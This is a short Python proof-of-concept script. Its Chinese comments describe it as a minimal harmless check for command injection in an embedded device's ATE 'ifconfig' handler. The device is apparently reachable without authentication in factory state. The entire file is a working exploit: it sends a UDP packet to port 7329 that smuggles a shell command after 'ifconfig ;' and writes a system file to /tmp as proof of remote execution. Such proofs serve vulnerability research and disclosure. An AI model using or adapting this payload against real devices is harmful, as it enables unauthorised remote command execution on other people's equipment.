#!/usr/bin/env python3
# C-1 最小无害验证：ifconfig 处理器拼接 doSystemCmd("ifconfig " + arg)
# 前置：GET /goform/ate 已启动 ATE（出厂态免认证）
import socket, sys
host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
pkt = b"ifconfig ;cat</etc_ro/group>/tmp/ate_rce_proof;#"
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(10)
s.sendto(pkt, (host, 7329))
print("sent:", pkt.decode())
print("resp:", s.recvfrom(4096)[0][:120])
